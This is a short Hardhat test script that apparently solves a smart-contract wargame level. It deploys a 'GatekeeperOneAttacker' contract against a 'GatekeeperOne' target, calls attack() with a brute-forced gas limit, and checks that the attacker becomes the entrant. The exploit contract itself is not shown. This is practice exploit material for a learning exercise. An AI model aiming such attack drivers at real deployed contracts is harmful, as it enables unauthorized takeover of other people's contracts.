import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
	it("Should work", async () => {
		const [, attacker] = await ethers.getSigners();
		const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0x924Ad48FCD74EA841F40123cac6479E21A5BAdc1");

		const GatekeeperOneAttacker = await ethers.getContractFactory("GatekeeperOneAttacker");
		const gatekeeperOneAttacker = await GatekeeperOneAttacker.connect(attacker).deploy(gatekeeperOne.address);

		// brute force the shit out of this value
		await gatekeeperOneAttacker.connect(attacker).attack({ gasLimit: 51596 });

		expect(await gatekeeperOne.entrant()).to.eq(attacker.address);
	})
})
